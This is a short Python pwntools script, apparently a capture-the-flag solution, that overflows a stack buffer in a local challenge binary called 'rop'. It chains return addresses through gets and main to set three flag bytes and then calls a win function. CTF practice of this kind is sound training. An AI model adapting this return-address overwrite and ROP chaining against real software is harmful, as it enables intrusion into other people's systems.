from pwn import *

offset = 28
r = process('./rop')

gets_plt = 0x8048430
main_plt = 0x80487c9

win1 = 0x0804a03d
win2 = 0x0804a03e
win3 = 0x0804a03f
win_func = 0x80486b3

for x in range(0,3):
  r.recvuntil('> ')

  payload = ""
  payload += "A"*offset
  payload += p32(gets_plt)
  payload += p32(main_plt)
  payload += p32(win1+x)

  r.sendline(payload)
  r.sendline("\x01")

r.recvuntil('> ')

payload = ""
payload += "A"*offset
payload += p32(win_func)
r.sendline(payload)
print r.recv()
